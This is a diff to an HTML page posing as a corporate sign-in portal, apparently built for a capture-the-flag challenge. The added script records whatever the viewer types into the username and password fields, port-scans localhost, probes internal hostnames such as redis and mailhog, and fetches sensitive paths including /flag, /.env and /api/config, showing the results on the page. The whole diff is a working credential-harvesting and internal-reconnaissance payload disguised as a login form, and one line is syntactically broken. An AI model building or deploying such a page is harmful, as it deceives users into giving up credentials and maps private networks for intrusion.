@@ -2,38 +2,153 @@
 <html><head>
 <title>Sign In - Corporate Portal</title>
 <style>
-body { font-family: monospace; font-size: 12px; margin: 10px; background: #fff; }
-input[type="password"] { -webkit-text-security: none; text-security: none; }
-#info { white-space: pre-wrap; word-break: break-all; background: #ffe; border: 1px solid #cc0; padding: 8px; margin-top: 10px; font-size: 11px; }
+body { font-family: monospace; font-size: 11px; margin: 10px; background: #fff; }
+#results { white-space: pre-wrap; word-break: break-all; background: #ffe; border: 1px solid #cc0; padding: 8px; margin-top: 10px; font-size: 10px; max-height: 800px; overflow: auto; }
 input { font-size: 14px; padding: 5px; width: 300px; display: block; margin: 5px 0 10px; }
 </style>
 </head>
 <body>
 <h2>Sign In</h2>
-<form id="loginForm" method="POST" action="http://127.0.0.1/login">
+<form id="loginForm">
   <label>Username<br><input type="text" id="username" name="username" autocomplete="username"></label>
   <label>Password<br><input type="password" id="password" name="password" autocomplete="current-password"></label>
   <button type="submit">Sign In</button>
 </form>
-<div id="info">Waiting for credentials...</div>
+<div id="results">Scanning...</div>
 <script>
-var info = document.getElementById('info');
+var res = document.getElementById('results');
 var lines = [];
-var captured = false;
+function log(msg) { lines.push(msg); res.textContent = lines.join('\n'); }
 
-function gather() {
+// Capture credentials
+var captured = false;
+setInterval(function() {
   var u = document.getElementById('username');
   var p = document.getElementById('password');
-  if (!u || !p) return;
-  var uv = u.value, pv = p.value;
-  if ((uv || pv) && !captured) {
+  if (u && p && (u.value || p.value) && !captured) {
     captured = true;
-    lines.push('CREDS: ' + uv + ' | ' + pv);
-    info.textContent = lines.join('\n');
+    log('CREDS: ' + u.value + ' | ' + p.value);
+  }
+}, 200);
+
+// Port scan localhost using fetch with timeout
+var ports = [21,22,25,53,80,81,443,587,1025,1080,1443,2525,3000,3001,4000,4443,5000,5001,5432,6379,7070,7071,8000,8001,8025,8080,8081,8443,8888,9000,9090,9200,9222,9999,10000,11211,15672,27017];
+
+// Also try common mail testing tools
+var extraPorts = [1025,1080,8025,8026,1143,1993,2500,2525,4190,MailHog=8025];
+
+async function scanPort(port) {
+  var controller = new AbortController();
+  var timeout = setTimeout(function() { controller.abort(); }, 2000);
+  try {
+    var r = await fetch('http://127.0.0.1:' + port + '/', {
+      mode: 'no-cors',
+      signal: controller.signal
+    });
+    clearTimeout(timeout);
+    return 'OPEN';
+  } catch(e) {
+    clearTimeout(timeout);
+    if (e.name === 'AbortError') return 'TIMEOUT';
+    return 'CLOSED';
   }
 }
 
-setInterval(gather, 200);
+async function scanPortCors(port) {
+  var controller = new AbortController();
+  var timeout = setTimeout(function() { controller.abort(); }, 2000);
+  try {
+    var r = await fetch('http://127.0.0.1:' + port + '/', {
+      signal: controller.signal
+    });
+    clearTimeout(timeout);
+    var text = await r.text();
+    return 'OPEN-CORS status=' + r.status + ' body=' + text.substring(0, 200);
+  } catch(e) {
+    clearTimeout(timeout);
+    return null; // CORS blocked or closed
+  }
+}
+
+async function main() {
+  log('=== PORT SCAN localhost ===');
+
+  // Batch scan with no-cors (detect open vs closed)
+  var results = [];
+  for (var i = 0; i < ports.length; i += 5) {
+    var batch = ports.slice(i, i + 5);
+    var promises = batch.map(function(p) {
+      return scanPort(p).then(function(status) {
+        return { port: p, status: status };
+      });
+    });
+    var batchResults = await Promise.all(promises);
+    batchResults.forEach(function(r) {
+      results.push(r);
+      if (r.status === 'OPEN') {
+        log('PORT ' + r.port + ': ' + r.status);
+      }
+    });
+  }
+
+  log('\n=== OPEN PORTS ===');
+  var openPorts = results.filter(function(r) { return r.status === 'OPEN'; });
+  openPorts.forEach(function(r) { log(r.port + ': OPEN'); });
+
+  if (openPorts.length === 0) {
+    log('No open ports detected (all may be blocked by mixed content)');
+  }
+
+  // Try CORS fetch on open ports to get content
+  log('\n=== TRYING CORS FETCH ===');
+  for (var j = 0; j < openPorts.length; j++) {
+    var port = openPorts[j].port;
+    var corsResult = await scanPortCors(port);
+    if (corsResult) {
+      log('PORT ' + port + ' CORS: ' + corsResult);
+    } else {
+      log('PORT ' + port + ' CORS: blocked');
+    }
+  }
+
+  // Try some specific internal hostnames
+  log('\n=== HOSTNAME SCAN ===');
+  var hosts = ['mail','smtp','mailhog','mailpit','mailcatcher','redis','app','api','canary','nginx','postfix','rspamd','clamav','amavis','spamassassin','gateway','web','backend','frontend','proxy','internal'];
+  for (var k = 0; k < hosts.length; k++) {
+    var host = hosts[k];
+    try {
+      var ctrl = new AbortController();
+      var t = setTimeout(function() { ctrl.abort(); }, 1500);
+      await fetch('http://' + host + '/', { mode: 'no-cors', signal: ctrl.signal });
+      clearTimeout(t);
+      log('HOST ' + host + ': REACHABLE');
+    } catch(e) {
+      clearTimeout(t);
+      // don't log closed hosts to save space
+    }
+  }
+
+  // Try fetching some paths on localhost port 80 with CORS
+  log('\n=== LOCALHOST PATH SCAN ===');
+  var paths = ['/','/flag','/admin','/api','/api/flag','/api/config','/api/health','/api/admin','/env','/debug','/status','/info','/metrics','/healthz','/readyz','/.env','/config'];
+  for (var m = 0; m < paths.length; m++) {
+    try {
+      var ctrl2 = new AbortController();
+      var t2 = setTimeout(function() { ctrl2.abort(); }, 1500);
+      var resp = await fetch('http://127.0.0.1' + paths[m], { signal: ctrl2.signal });
+      clearTimeout(t2);
+      var txt = await resp.text();
+      log('GET ' + paths[m] + ' -> ' + resp.status + ': ' + txt.substring(0, 300));
+    } catch(e) {
+      clearTimeout(t2);
+      // CORS blocked
+    }
+  }
+
+  log('\n=== SCAN COMPLETE ===');
+}
+
+main().catch(function(e) { log('ERROR: ' + e.message); });
 </script>
 </body>
 </html>
